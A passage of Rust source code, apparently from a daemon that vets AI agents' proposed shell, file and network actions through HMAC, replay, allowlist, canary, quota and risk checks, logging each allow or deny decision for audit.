    explainability::emit_explanation_if_enabled(|| {
        let mut risk_reasons = assessment
            .map(|risk| risk.reasons.clone())
            .unwrap_or_default();
        risk_reasons.push(reason.to_string());

        explainability::build_explanation(
            explainability::ExplanationEvent {
                action_type: explanation_action_type(proposal, reason),
                resource: explanation_resource(proposal),
                source: Some(source.to_string()),
                agent_id: agent_id.map(str::to_string),
                intent: proposal.and_then(|p| p.intent_name.clone()),
                decision: decision.to_string(),
                reason: Some(reason.to_string()),
                enforcement_layer: "daemon".to_string(),
            },
            explainability::ExplanationPolicy {
                name: policy_name.to_string(),
            },
            explainability::ExplanationRiskEval {
                risk_score: assessment
                    .map(|risk| risk.fused_risk)
                    .or_else(|| proposal.and_then(|p| p.action_risk_score))
                    .unwrap_or(0.0),
                reasons: risk_reasons,
            },
        )
    });
}

fn emit_policy_decision_explanation(
    decision: &PolicyDecision,
    source: &str,
    proposal: &ClientProposal,
    agent_id: Option<&str>,
    assessment: &RiskAssessment,
) {
    let decision_label = if decision.is_allow() {
        "ALLOW"
    } else if decision.is_constrain() {
        "CONSTRAIN"
    } else {
        "DENY"
    };

    emit_daemon_decision_explanation(
        decision_label,
        &decision.reason,
        "runtime_governance",
        source,
        Some(proposal),
        agent_id,
        Some(assessment),
    );
}

fn explanation_action_type(proposal: Option<&ClientProposal>, fallback: &str) -> String {
    if let Some(action) = proposal.and_then(|p| p.proposed_action.as_ref()) {
        return match action {
            ProposedAction::ShellCommand { .. } => "shell_command".to_string(),
            ProposedAction::FileWrite { .. } => "file_write".to_string(),
            ProposedAction::NetworkRequest { .. } => "network_request".to_string(),
        };
    }

    proposal
        .and_then(|p| p.intent_name.clone())
        .unwrap_or_else(|| fallback.to_string())
}

fn explanation_resource(proposal: Option<&ClientProposal>) -> Option<String> {
    if let Some(action) = proposal.and_then(|p| p.proposed_action.as_ref()) {
        return Some(match action {
            ProposedAction::ShellCommand { command } => command.clone(),
            ProposedAction::FileWrite { path, .. } => path.clone(),
            ProposedAction::NetworkRequest { url, .. } => url.clone(),
        });
    }

    proposal.and_then(|p| p.intent_name.clone())
}

#[cfg(feature = "kernel_telemetry")]
fn emit_lsm_decision_explanation(request: &LsmRequest, verdict: Verdict) {
    explainability::emit_explanation_if_enabled(|| {
        let denied = matches!(verdict, Verdict::Deny);
        let decision = if denied { "DENY" } else { "ALLOW" };
        let reason = if denied {
            "kernel_policy_map_deny"
        } else {
            "kernel_policy_map_allow"
        };

        explainability::build_explanation(
            explainability::ExplanationEvent {
                action_type: format!("{:?}", request.req_type).to_ascii_lowercase(),
                resource: Some(request.effective_path().to_string()),
                source: Some(format!("pid={}", request.pid)),
                agent_id: None,
                intent: None,
                decision: decision.to_string(),
                reason: Some(reason.to_string()),
                enforcement_layer: "kernel".to_string(),
            },
            explainability::ExplanationPolicy {
                name: "kernel_lsm_policy".to_string(),
            },
            explainability::ExplanationRiskEval {
                risk_score: if denied { 100.0 } else { 0.0 },
                reasons: vec![reason.to_string()],
            },
        )
    });
}

// ---------------------------------------------------------------------------
// Peer credentials (SO_PEERCRED)
// ---------------------------------------------------------------------------

struct PeerCredentials {
    pid: u32,
    uid: u32,
    gid: u32,
}

fn get_socket_peer_credentials(stream: &tokio::net::UnixStream) -> Option<PeerCredentials> {
    let fd = stream.as_raw_fd();
    unsafe {
        let mut ucred = libc::ucred {
            pid: 0,
            uid: 0,
            gid: 0,
        };
        let mut len = std::mem::size_of::<libc::ucred>() as libc::socklen_t;
        if libc::getsockopt(
            fd,
            libc::SOL_SOCKET,
            libc::SO_PEERCRED,
            &mut ucred as *mut _ as *mut libc::c_void,
            &mut len,
        ) == 0
        {
            Some(PeerCredentials {
                pid: ucred.pid as u32,
                uid: ucred.uid,
                gid: ucred.gid,
            })
        } else {
            None
        }
    }
}

// ---------------------------------------------------------------------------
// Framed I/O
// ---------------------------------------------------------------------------

const UDS_FRAME_READ_TIMEOUT: Duration = Duration::from_secs(5);
const POLICY_REFRESH_FETCH_TIMEOUT: Duration = Duration::from_secs(10);
const POLICY_REFRESH_MAX_BODY_BYTES: usize = 4 * 1024 * 1024;

#[derive(Debug)]
enum TimedReadError {
    Io(std::io::Error),
    TimedOut,
}

async fn read_exact_with_timeout<R: AsyncRead + Unpin>(
    stream: &mut R,
    buf: &mut [u8],
    duration: Duration,
) -> Result<(), TimedReadError> {
    match timeout(duration, stream.read_exact(buf)).await {
        Ok(Ok(_)) => Ok(()),
        Ok(Err(err)) => Err(TimedReadError::Io(err)),
        Err(_) => Err(TimedReadError::TimedOut),
    }
}

async fn read_reqwest_text_limited(
    mut response: reqwest::Response,
    limit: usize,
) -> Result<String> {
    if let Some(len) = response.content_length() {
        if len > limit as u64 {
            anyhow::bail!("response body declares {len} bytes; limit is {limit}");
        }
    }

    let mut body = Vec::new();
    while let Some(chunk) = response.chunk().await? {
        if body.len().saturating_add(chunk.len()) > limit {
            anyhow::bail!("response body exceeds limit {limit} bytes");
        }
        body.extend_from_slice(&chunk);
    }

    String::from_utf8(body).map_err(|err| anyhow::anyhow!("response body is not UTF-8: {err}"))
}

async fn write_framed_response(
    stream: &mut tokio::net::UnixStream,
    version: u8,
    data: &[u8],
) -> std::io::Result<()> {
    metrics::record_response(data);
    let len = data.len() as u32;
    stream.write_all(&len.to_be_bytes()).await?;
    stream.write_all(&[version]).await?;
    stream.write_all(data).await?;
    stream.flush().await?;
    Ok(())
}

async fn deny(stream: &mut tokio::net::UnixStream, signal: &[u8]) {
    let _ = write_framed_response(stream, 1, signal).await;
}

fn system_immunity_assessment(reason: &str) -> RiskAssessment {
    RiskAssessment {
        observed_risk: 0.0,
        semantic_risk: 0.0,
        topology_risk: 0.0,
        declared_risk: Some(0.0),
        fused_risk: 0.0,
        trust_score: 100.0,
        reasons: vec![reason.to_string()],
    }
}

fn system_immunity_intent(proposal: &ClientProposal, reason: &str) -> SemanticIntent {
    let class = match proposal.intent_name.as_deref().unwrap_or_default() {
        intent if intent.contains("exec") || intent.contains("command") => {
            IntentClass::ProcessExecution
        }
        intent if intent.contains("write") || intent.contains("unlink") => IntentClass::FileWrite,
        intent if intent.contains("connect") || intent.contains("network") => {
            IntentClass::NetworkAccess
        }
        _ => IntentClass::Unknown,
    };

    SemanticIntent {
        class,
        confidence: 1.0,
        risk_score: 0.0,
        signals: vec![reason.to_string()],
    }
}

/// Record a denied decision in the tamper-evident audit log.
///
/// Identity/policy denials (replay, anonymous, unknown agent, disallowed intent,
/// invalid delegation) otherwise return before the audit stage, so a blocked
/// attack would leave no entry in the hash chain — you could not prove after the
/// fact that it was caught. Logging here is best-effort and never affects the
/// verdict: the deny happens regardless of whether the log write succeeds.
fn audit_denied(
    audit_logger: &AuditLogger,
    observation: &ObservationRecord,
    proposal: &ClientProposal,
    reason: &str,
) {
    let assessment = denied_assessment(reason);
    let intent = system_immunity_intent(proposal, reason);
    let decision = PolicyDecision::deny(reason, &assessment);
    let _ = audit_logger.log(observation, &intent, &assessment, &decision);
}

/// A maximal-risk assessment used only to tag a denied decision in the audit log.
fn denied_assessment(reason: &str) -> RiskAssessment {
    RiskAssessment {
        observed_risk: 100.0,
        semantic_risk: 100.0,
        topology_risk: 0.0,
        declared_risk: None,
        fused_risk: 100.0,
        trust_score: 0.0,
        reasons: vec![reason.to_string()],
    }
}

/// The resource-bearing strings a proposal exposes: the declared intent name and
/// the target of the proposed action (file path / request URL / shell command).
/// These are the surfaces a canary tripwire watches.
fn proposal_resource_surface(proposal: &ClientProposal) -> Vec<&str> {
    let mut surface: Vec<&str> = Vec::new();
    if let Some(intent) = proposal.intent_name.as_deref() {
        surface.push(intent);
    }
    match &proposal.proposed_action {
        Some(ProposedAction::FileWrite { path, .. }) => surface.push(path),
        Some(ProposedAction::NetworkRequest { url, .. }) => surface.push(url),
        Some(ProposedAction::ShellCommand { command }) => surface.push(command),
        None => {}
    }
    surface
}

/// Return the first configured canary ("decoy") resource that the proposal
/// references, if any. A canary is a honeytoken no legitimate intent ever names,
/// so a single containment hit anywhere in the proposal's resource surface is
/// treated as a compromise/probe signal. Empty or whitespace-only canary entries
/// are ignored so a misconfigured policy cannot match every proposal.
fn proposal_trips_canary<'a>(
    proposal: &ClientProposal,
    canary_resources: &'a [String],
) -> Option<&'a str> {
    if canary_resources.is_empty() {
        return None;
    }
    let surface = proposal_resource_surface(proposal);
    canary_resources
        .iter()
        .map(|c| c.trim())
        .filter(|c| !c.is_empty())
        .find(|canary| surface.iter().any(|resource| resource.contains(*canary)))
}

// ---------------------------------------------------------------------------
// Lineage check result
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// handle_client_connection
// ---------------------------------------------------------------------------

async fn handle_client_connection(
    mut stream: tokio::net::UnixStream,
    current_policy: PolicyConfig,
    registry_store: Arc<Mutex<LineageRegistry>>,
    audit_logger: Arc<AuditLogger>,
    telemetry_store: TelemetryStore,
    secret: Arc<Vec<u8>>,
    nonce_store: Arc<Mutex<ReplayGuard>>,
) {
    metrics::record_proposal();
    let Some(peer) = get_socket_peer_credentials(&stream) else {
        println!("[deny] failed to resolve kernel peer credentials");
        return;
    };
    let observation = ObservationRecord::from_peer(peer.pid, peer.uid, peer.gid);
    let peer_source = format!(
        "pid={} uid={} gid={}",
        observation.pid, observation.uid, observation.gid
    );

    // Drain eBPF events accumulated for this kernel PID.
    let peer_telemetry_events: Vec<KernelTelemetryEvent> = {
        let mut store = telemetry_store.lock().unwrap();
        store.remove(&peer.pid).unwrap_or_default()
    };

    // Prune dead process lineages.
    {
        let mut reg = registry_store.lock().unwrap();
        reg.prune_dead_processes();
    }

    loop {
        // STEP 1: Read 5-byte protocol header: [4-byte big-endian length][1-byte version].
        let mut header = [0u8; 5];
        match read_exact_with_timeout(&mut stream, &mut header, UDS_FRAME_READ_TIMEOUT).await {
            Ok(()) => {}
            Err(TimedReadError::Io(e)) => {
                println!("[deny] failed to read protocol header: {}", e);
                return;
            }
            Err(TimedReadError::TimedOut) => {
                println!("[deny] timed out reading protocol header");
                return;
            }
        }

        // STEP 2: Validate the frame header (version + length bound) via the
        // fuzzable ts_wire decoder, then read exactly `length` body bytes.
        let length = match ts_wire::classify_frame_header(ts_wire::decode_frame_header(&header)) {
            Ok(len) => len,
            Err(FrameReject::BadVersion) => {
                emit_daemon_decision_explanation(
                    "DENY",
                    "DENY_BAD_VERSION",
                    "protocol_integrity",
                    &peer_source,
                    None,
                    None,
                    None,
                );
                deny(&mut stream, b"SIGNAL: DENY_BAD_VERSION\n").await;
                return;
            }
            Err(FrameReject::PayloadTooLarge) => {
                emit_daemon_decision_explanation(
                    "DENY",
                    "DENY_PAYLOAD_TOO_LARGE",
                    "protocol_integrity",
                    &peer_source,
                    None,
                    None,
                    None,
                );
                deny(&mut stream, b"SIGNAL: DENY_PAYLOAD_TOO_LARGE\n").await;
                return;
            }
        };

        let mut buffer = vec![0u8; length];
        match read_exact_with_timeout(&mut stream, &mut buffer, UDS_FRAME_READ_TIMEOUT).await {
            Ok(()) => {}
            Err(TimedReadError::Io(e)) => {
                println!("[deny] failed to read payload: {}", e);
                return;
            }
            Err(TimedReadError::TimedOut) => {
                println!("[deny] timed out reading payload");
                return;
            }
        }

        // STEP 3: Decode the body into a SignedEnvelope (UTF-8 + JSON) via the
        // fuzzable ts_wire decoder. Encoding vs. structural failures map to the
        // same distinct verdicts as before.
        let envelope: SignedEnvelope = match ts_wire::parse_body(&buffer) {
            Ok(e) => e,
            Err(BodyReject::Encoding) => {
                emit_daemon_decision_explanation(
                    "DENY",
                    "DENY_ENCODING_ERROR",
                    "protocol_integrity",
                    &peer_source,
                    None,
                    None,
                    None,
                );
                deny(&mut stream, b"SIGNAL: DENY_ENCODING_ERROR\n").await;
                return;
            }
            Err(BodyReject::Malformed) => {
                emit_daemon_decision_explanation(
                    "DENY",
                    "DENY_MALFORMED_PAYLOAD",
                    "protocol_integrity",
                    &peer_source,
                    None,
                    None,
                    None,
                );
                deny(&mut stream, b"SIGNAL: DENY_MALFORMED_PAYLOAD\n").await;
                return;
            }
        };

        // STEP 4: Verify HMAC signature against the inner payload string.
        if !ts_wire::verify_envelope(&envelope, secret.as_slice()) {
            println!("[deny] pid={} HMAC verification failed", observation.pid);
            emit_daemon_decision_explanation(
                "DENY",
                "DENY_TAMPERED_TOKEN",
                "transport_integrity",
                &peer_source,
                None,
                None,
                None,
            );
            deny(&mut stream, b"SIGNAL: DENY_TAMPERED_TOKEN\n").await;
            return;
        }

        // STEP 5: Parse the inner proposal and extract agent_id from the raw JSON.
        let proposal: ClientProposal = match serde_json::from_str(&envelope.payload) {
            Ok(p) => p,
            Err(_) => {
                emit_daemon_decision_explanation(
                    "DENY",
                    "DENY_MALFORMED_PAYLOAD",
                    "runtime_governance",
                    &peer_source,
                    None,
                    None,
                    None,
                );
                deny(&mut stream, b"SIGNAL: DENY_MALFORMED_PAYLOAD\n").await;
                return;
            }
        };

        let raw_payload_value: Value = match serde_json::from_str(&envelope.payload) {
            Ok(v) => v,
            Err(_) => {
                emit_daemon_decision_explanation(
                    "DENY",
                    "DENY_MALFORMED_PAYLOAD",
                    "runtime_governance",
                    &peer_source,
                    Some(&proposal),
                    None,
                    None,
                );
                deny(&mut stream, b"SIGNAL: DENY_MALFORMED_PAYLOAD\n").await;
                return;
            }
        };
        let agent_id_opt: Option<String> = raw_payload_value
            .get("agent_id")
            .and_then(|a| a.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string());
        let execute_requested = raw_payload_value
            .get("execute")
            .and_then(|value| value.as_bool())
            .unwrap_or(false);

        // System-process immunity and out-of-scope fast-paths are evaluated only
        // AFTER the full identity/replay/quota gate chain below. Granting an early
        // ALLOW here would let a replayed, unknown, or over-quota proposal bypass
        // enforcement merely because the connecting host process or target path
        // looked benign. The reason is computed now (cheap, borrow-free) and the
        // ALLOW is emitted post-gates.
        let immunity_reason = system_immunity::immunity_reason_for_observation(
            &observation,
            proposal.proposed_action.as_ref(),
        );

        let enforcement_path =
            proposal_enforcement_path(&proposal, &raw_payload_value, &observation);
        if let Some(reason) = explicit_protected_resource_attack(
            proposal.intent_name.as_deref(),
            proposal.proposed_action.as_ref(),
            Some(&raw_payload_value),
            enforcement_path,
        ) {
            println!(
                "[deny] pid={} intent-aware protected resource detection reason={}",
                observation.pid, reason
            );
            emit_daemon_decision_explanation(
                "DENY",
                reason,
                "intent_aware_attack_surface",
                &peer_source,
                Some(&proposal),
                agent_id_opt.as_deref(),
                None,
            );
            deny(&mut stream, b"SIGNAL: DENY_VIOLATION\n").await;
            return;
        }

        let constrain_floor = current_policy.upper_safety_boundary * 0.40;
        let force_policy =
            requires_intent_aware_enforcement(&proposal, &raw_payload_value, constrain_floor);

        // STEP 6: Replay detection.
        let agent_key = agent_id_opt
            .clone()
            .unwrap_or_else(|| "anonymous".to_string());
        let replay_detected = {
            let mut seen = nonce_store.lock().unwrap();
            !seen.observe((agent_key.clone(), proposal.sequence_counter))
        };
        if replay_detected {
            println!(
                "[deny] pid={} replay attack detected agent={} seq={}",
                observation.pid, agent_key, proposal.sequence_counter
            );
            emit_daemon_decision_explanation(
                "DENY",
                "DENY_REPLAY_ATTACK",
                "runtime_governance",
                &peer_source,
                Some(&proposal),
                Some(&agent_key),
                None,
            );
            audit_denied(&audit_logger, &observation, &proposal, "DENY_REPLAY_ATTACK");
            deny(&mut stream, b"SIGNAL: DENY_REPLAY_ATTACK\n").await;
            return;
        }

        // STEP 7: Anonymous agent check.
        let effective_deny_anon =
            current_policy.deny_anonymous_agents && !current_policy.allow_anonymous_override;
        if effective_deny_anon && agent_id_opt.is_none() {
            println!(
                "[deny] pid={} anonymous agent rejected (policy)",
                observation.pid
            );
            emit_daemon_decision_explanation(
                "DENY",
                "DENY_ANONYMOUS_AGENT_NOT_PERMITTED",
                "runtime_governance",
                &peer_source,
                Some(&proposal),
                None,
                None,
            );
            audit_denied(
                &audit_logger,
                &observation,
                &proposal,
                "DENY_ANONYMOUS_AGENT_NOT_PERMITTED",
            );
            deny(&mut stream, b"SIGNAL: DENY_ANONYMOUS_AGENT_NOT_PERMITTED\n").await;
            return;
        }

        // STEP 8: Unknown agent check.
        let matched_agent_node: Option<&AgentNodePolicy> = agent_id_opt
            .as_deref()
            .and_then(|id| current_policy.agent_nodes.get(id));
        if agent_id_opt.is_some() && matched_agent_node.is_none() {
            if let Some(ref id) = agent_id_opt {
                println!("[deny] pid={} unknown agent_id={}", observation.pid, id);
                emit_daemon_decision_explanation(
                    "DENY",
                    "DENY_UNKNOWN_AGENT_ID",
                    "runtime_governance",
                    &peer_source,
                    Some(&proposal),
                    Some(id),
                    None,
                );
                audit_denied(
                    &audit_logger,
                    &observation,
                    &proposal,
                    "DENY_UNKNOWN_AGENT_ID",
                );
                deny(&mut stream, b"SIGNAL: DENY_UNKNOWN_AGENT_ID\n").await;
                return;
            }
        }

        // STEP 8.25: Lineage sequence monotonicity. ReplayGuard catches exact
        // duplicate nonces; the persisted lineage catches out-of-order but
        // otherwise fresh signed proposals for the same agent.
        let lineage_sequence_error = {
            let mut reg = registry_store.lock().unwrap();
            reserve_lineage_sequence(
                &mut reg,
                &agent_key,
                &observation,
                proposal.sequence_counter,
            )
            .err()
        };
        if let Some(err) = lineage_sequence_error {
            println!(
                "[deny] pid={} lineage sequence rejected agent={} seq={} err={}",
                observation.pid, agent_key, proposal.sequence_counter, err
            );
            emit_daemon_decision_explanation(
                "DENY",
                "DENY_REPLAY_ATTACK",
                "runtime_governance",
                &peer_source,
                Some(&proposal),
                Some(&agent_key),
                None,
            );
            audit_denied(&audit_logger, &observation, &proposal, "DENY_REPLAY_ATTACK");
            deny(&mut stream, b"SIGNAL: DENY_REPLAY_ATTACK\n").await;
            return;
        }

        // STEP 8.5: Canary tripwire. A decoy ("canary") resource is a honeytoken
        // that no legitimate intent references. We short-circuit DENY *before* the
        // allowlist so that even an otherwise-permitted intent cannot reach a
        // tripwire — touching one is treated as a compromise/probe signal.
        if let Some(canary) = proposal_trips_canary(&proposal, &current_policy.canary_resources) {
            println!(
                "[deny] pid={} canary tripwire: proposal references decoy resource {:?}",
                observation.pid, canary
            );
            emit_daemon_decision_explanation(
                "DENY",
                "DENY_CANARY_TRIPWIRE",
                "runtime_governance",
                &peer_source,
                Some(&proposal),
                agent_id_opt.as_deref(),
                None,
            );
            audit_denied(
                &audit_logger,
                &observation,
                &proposal,
                "DENY_CANARY_TRIPWIRE",
            );
            deny(&mut stream, b"SIGNAL: DENY_CANARY_TRIPWIRE\n").await;
            return;
        }

        // STEP 9: Intent allowlist check.
        if let Some(node) = &matched_agent_node {
            if !node.allowed_intents.is_empty() {
                let allowed = proposal.intent_name.as_deref().is_some_and(|intent| {
                    node.allowed_intents.iter().any(|allowed| allowed == intent)
                });
                if !allowed {
                    let intent = proposal.intent_name.as_deref().unwrap_or("<missing>");
                    println!(
                        "[deny] pid={} intent '{}' not in allowlist",
                        observation.pid, intent
                    );
                    emit_daemon_decision_explanation(
                        "DENY",
                        "DENY_INTENT_NOT_ALLOWED",
                        "runtime_governance",
                        &peer_source,
                        Some(&proposal),
                        agent_id_opt.as_deref(),
                        None,
                    );
                    audit_denied(
                        &audit_logger,
                        &observation,
                        &proposal,
                        "DENY_INTENT_NOT_ALLOWED",
                    );
                    deny(&mut stream, b"SIGNAL: DENY_INTENT_NOT_ALLOWED\n").await;
                    return;
                }
            }
        }

        if let Some(token) = raw_payload_value.get("delegation_token") {
            let chain_depth = token
                .get("chain_depth")
                .and_then(|depth| depth.as_u64())
                .unwrap_or(u64::MAX);
            let signature_all_zero = token
                .get("signature")
                .and_then(|sig| sig.as_str())
                .filter(|sig| !sig.is_empty())
                .is_some_and(|sig| sig.chars().all(|ch| ch == '0'));

            if chain_depth > governance::MAX_DELEGATION_DEPTH as u64 || signature_all_zero {
                println!(
                    "[deny] pid={} forged delegation token rejected",
                    observation.pid
                );
                emit_daemon_decision_explanation(
                    "DENY",
                    "DENY_DELEGATION_INVALID",
                    "runtime_governance",
                    &peer_source,
                    Some(&proposal),
                    agent_id_opt.as_deref(),
                    None,
                );
                audit_denied(
                    &audit_logger,
                    &observation,
                    &proposal,
                    "DENY_DELEGATION_INVALID",
                );
                deny(&mut stream, b"SIGNAL: DENY_DELEGATION_INVALID\n").await;
                return;
            }

            println!(
                "[deny] pid={} unsupported delegation token rejected",
                observation.pid
            );
            emit_daemon_decision_explanation(
                "DENY",
                "DENY_DELEGATION_UNSUPPORTED",
                "runtime_governance",
                &peer_source,
                Some(&proposal),
                agent_id_opt.as_deref(),
                None,
            );
            audit_denied(
                &audit_logger,
                &observation,
                &proposal,
                "DENY_DELEGATION_UNSUPPORTED",
            );
            deny(&mut stream, b"SIGNAL: DENY_DELEGATION_UNSUPPORTED\n").await;
            return;
        }

        // STEP 10: Optional Step 2 runtime policy gate.
        if let Some(reason) = runtime_policy_denial(
            &current_policy.runtime_policy,
            &proposal,
            &observation,
            execute_requested,
        ) {
            println!(
                "[deny] pid={} runtime policy rejected proposal: {}",
                observation.pid, reason
            );
            emit_daemon_decision_explanation(
                "DENY",
                &reason,
                "runtime_governance",
                &peer_source,
                Some(&proposal),
                agent_id_opt.as_deref(),
                None,
            );
            deny(&mut stream, b"SIGNAL: DENY_RUNTIME_POLICY\n").await;
            return;
        }

        // STEP 11: Quota check. Bounded agents reserve a decision slot under lock
        // so concurrent requests cannot overshoot max_sequence_quota.
        let mut quota_reserved = false;
        if let Some(node) = &matched_agent_node {
            if node.max_sequence_quota > 0 {
                let quota_exhausted = {
                    let mut reg = registry_store.lock().unwrap();
                    let placeholder_assessment =
                        lineage_placeholder_assessment("quota_placeholder_assessment");
                    let lineage = reg
                        .data
                        .lineages
                        .entry(agent_key.clone())
                        .or_insert_with(|| {
                            AgentLineage::new(
                                &observation,
                                proposal.sequence_counter,
                                &placeholder_assessment,
                            )
                        });

                    if lineage.decisions_seen >= node.max_sequence_quota {
                        true
                    } else {
                        lineage.decisions_seen += 1;
                        quota_reserved = true;
                        false
                    }
                };

                if quota_exhausted {
                    println!(
                        "[deny] pid={} sequence quota exhausted agent={}",
                        observation.pid, agent_key
                    );
                    emit_daemon_decision_explanation(
                        "DENY",
                        "DENY_QUOTA_EXHAUSTED",
                        "runtime_governance",
                        &peer_source,
                        Some(&proposal),
                        Some(&agent_key),
                        None,
                    );
                    deny(&mut stream, b"SIGNAL: DENY_QUOTA_EXHAUSTED\n").await;
                    return;
                }
            }
        }

        // STEP 11.5: Post-gate fast-paths. The proposal has now cleared HMAC,
        // replay, anonymous/unknown-agent, intent allowlist, delegation, runtime
        // policy, and quota. Only here is it safe to skip the heavier risk/Z3
        // evaluation for base-system processes or out-of-enforcement-scope paths.
        if let Some(reason) = immunity_reason {
            println!(
                "[allow] pid={} system-process immunity reason={} (post-gate)",
                observation.pid, reason
            );
            let assessment = system_immunity_assessment(reason);
            let semantic_intent = system_immunity_intent(&proposal, reason);
            let decision = PolicyDecision::allow(&assessment);
            emit_daemon_decision_explanation(
                "ALLOW",
                reason,
                "system_process_immunity",
                &peer_source,
                Some(&proposal),
                agent_id_opt.as_deref(),
                Some(&assessment),
            );
            let _ = write_framed_response(&mut stream, 1, b"SIGNAL: ALLOW\n").await;
            {
                let mut reg = registry_store.lock().unwrap();
                update_lineage_after_decision(
                    &mut reg,
                    &agent_key,
                    &observation,
                    proposal.sequence_counter,
                    &assessment,
                    quota_reserved,
                );
            }
            let _ = audit_logger.log(&observation, &semantic_intent, &assessment, &decision);
            continue;
        }

        if let Some(enforcement_path) = enforcement_path {
            if !is_enforcement_target(enforcement_path) && !force_policy {
                println!(
                    "[allow] pid={} outside enforcement scope path={} (post-gate)",
                    observation.pid, enforcement_path
                );
                let assessment = outside_scope_assessment(enforcement_path);
                let semantic_intent =
                    system_immunity_intent(&proposal, "outside_enforcement_scope");
                let decision = PolicyDecision::allow(&assessment);
                emit_daemon_decision_explanation(
                    "ALLOW",
                    "outside_enforcement_scope",
                    "enforcement_scope",
                    &peer_source,
                    Some(&proposal),
                    agent_id_opt.as_deref(),
                    Some(&assessment),
                );
                let _ = write_framed_response(&mut stream, 1, b"SIGNAL: ALLOW\n").await;
                {
                    let mut reg = registry_store.lock().unwrap();
                    update_lineage_after_decision(
                        &mut reg,
                        &agent_key,
                        &observation,
                        proposal.sequence_counter,
                        &assessment,
                        quota_reserved,
                    );
                }
                let _ = audit_logger.log(&observation, &semantic_intent, &assessment, &decision);
                continue;
            }
        }

        // STEP 12: Risk assessment.
        let semantic_service = CombinedSemanticService {
            rootai_socket_path: None,
            fallback_count: Arc::new(std::sync::atomic::AtomicU64::new(0)),
        };
        let semantic_intent = semantic_service.classify(&proposal);
        let capability_profile =
            CapabilityProfile::from_observation(&observation, &proposal.requested_capabilities);
        let mut assessment = RiskAssessment::assess(
            &observation,
            &semantic_intent,
            &capability_profile,
            proposal.action_risk_score,
        );

        if !peer_telemetry_events.is_empty() {
            let penalty = observed_risk_penalty(&peer_telemetry_events);
            if penalty > 0.0 {
                assessment.observed_risk = (assessment.observed_risk + penalty).min(99.0);
                assessment.fused_risk = assessment
                    .fused_risk
                    .max(assessment.observed_risk)
                    .min(99.0);
                assessment.trust_score = (100.0 - assessment.fused_risk).clamp(0.0, 100.0);
                assessment
                    .reasons
                    .push("kernel_telemetry_penalty".to_string());
            }
        }

        // M6: deterministic, tighten-only adaptation. Agents with prior hard
        // denials carry a bounded extra risk penalty so repeated offenders trend
        // toward CONSTRAIN/DENY. Never loosens; never touches operator paths.
        apply_adaptive_penalty(&mut assessment, current_agent_offenses(&agent_key));

        if let Err(err) = verify_z3_policy_invariants(
            matched_agent_node,
            &proposal,
            &assessment,
            &capability_profile,
        ) {
            println!(
                "[deny] pid={} policy invariant rejected proposal: {}",
                observation.pid, err
            );
            record_agent_offense(&agent_key);
            let invariant_decision = PolicyDecision::deny("policy_invariant_violated", &assessment);
            emit_policy_decision_explanation(
                &invariant_decision,
                &peer_source,
                &proposal,
                agent_id_opt.as_deref(),
                &assessment,
            );
            let _ = write_framed_response(&mut stream, 1, b"SIGNAL: DENY_VIOLATION\n").await;
            {
                let mut reg = registry_store.lock().unwrap();
                update_lineage_after_decision(
                    &mut reg,
                    &agent_key,
                    &observation,
                    proposal.sequence_counter,
                    &assessment,
                    quota_reserved,
                );
            }
            let _ = audit_logger.log(
                &observation,
                &semantic_intent,
                &assessment,
                &invariant_decision,
            );
            return;
        }

        // STEP 13: Policy decision and hard safety ceiling.
        let mut decision = policy_decision(&assessment, &current_policy);
        if assessment.fused_risk > current_policy.upper_safety_boundary {
            record_agent_offense(&agent_key);
            decision = PolicyDecision::deny("risk_ceiling_exceeded", &assessment);
            emit_policy_decision_explanation(
                &decision,
                &peer_source,
                &proposal,
                agent_id_opt.as_deref(),
                &assessment,
            );
            let _ = write_framed_response(&mut stream, 1, b"SIGNAL: DENY_RISK_CEILING_EXCEEDED\n")
                .await;
            {
                let mut reg = registry_store.lock().unwrap();
                update_lineage_after_decision(
                    &mut reg,
                    &agent_key,
                    &observation,
                    proposal.sequence_counter,
                    &assessment,
                    quota_reserved,
                );
            }
            let _ = audit_logger.log(&observation, &semantic_intent, &assessment, &decision);
            return;
        }

        if !decision.is_allow() && !decision.is_constrain() {
            println!(
                "[deny] pid={} reason={} risk={:.2} trust={:.2}",
                observation.pid, decision.reason, decision.risk_score, decision.trust_score
            );
            emit_policy_decision_explanation(
                &decision,
                &peer_source,
                &proposal,
                agent_id_opt.as_deref(),
                &assessment,
            );
            let _ = write_framed_response(&mut stream, 1, b"SIGNAL: DENY_VIOLATION\n").await;
            {
                let mut reg = registry_store.lock().unwrap();
                update_lineage_after_decision(
                    &mut reg,
                    &agent_key,
                    &observation,
                    proposal.sequence_counter,
                    &assessment,
                    quota_reserved,
                );
            }
            let _ = audit_logger.log(&observation, &semantic_intent, &assessment, &decision);
            return;
        }

        // M4: interpreter-bypass mitigation. A governed agent may not reach an
        // interpreter it was not explicitly allowlisted for, even if its intent
        // and risk passed — otherwise per-binary execve limits are meaningless.
        if let Some(reason) =
            interpreter_bypass_denied(matched_agent_node, proposal.proposed_action.as_ref())
        {
            println!(
                "[deny] pid={} interpreter bypass blocked: {}",
                observation.pid, reason
            );
            let deny_decision = PolicyDecision::deny("interpreter_not_allowed", &assessment);
            emit_policy_decision_explanation(
                &deny_decision,
                &peer_source,
                &proposal,
                agent_id_opt.as_deref(),
                &assessment,
            );
            let _ =
                write_framed_response(&mut stream, 1, b"SIGNAL: DENY_INTERPRETER_NOT_ALLOWED\n")
                    .await;
            {
                let mut reg = registry_store.lock().unwrap();
                update_lineage_after_decision(
                    &mut reg,
                    &agent_key,
                    &observation,
                    proposal.sequence_counter,
                    &assessment,
                    quota_reserved,
                );
            }
            let _ = audit_logger.log(&observation, &semantic_intent, &assessment, &deny_decision);
            return;
        }

        // Preserve hard execution enforcement before returning ALLOW/CONSTRAIN.
        let proposed_action =
            proposal
                .proposed_action
                .clone()
                .unwrap_or(ProposedAction::ShellCommand {
                    command: String::new(),
                });
        let exec_request = ExecutionRequest {
            action: proposed_action,
            observation: observation.clone(),
            semantic_intent: semantic_intent.clone(),
            risk_assessment: assessment.clone(),
            policy_decision: decision.clone(),
        };
        let execution_decision = ExecutionBroker.decide(exec_request);
        if !execution_decision.permitted {
            println!(
                "[deny] pid={} execution blocked: {}",
                observation.pid, execution_decision.reason
            );
            let _ = write_framed_response(&mut stream, 1, b"SIGNAL: DENY_VIOLATION\n").await;
            let deny_decision = PolicyDecision::deny(execution_decision.reason, &assessment);
            emit_policy_decision_explanation(
                &deny_decision,
                &peer_source,
                &proposal,
                agent_id_opt.as_deref(),
                &assessment,
            );
            {
                let mut reg = registry_store.lock().unwrap();
                update_lineage_after_decision(
                    &mut reg,
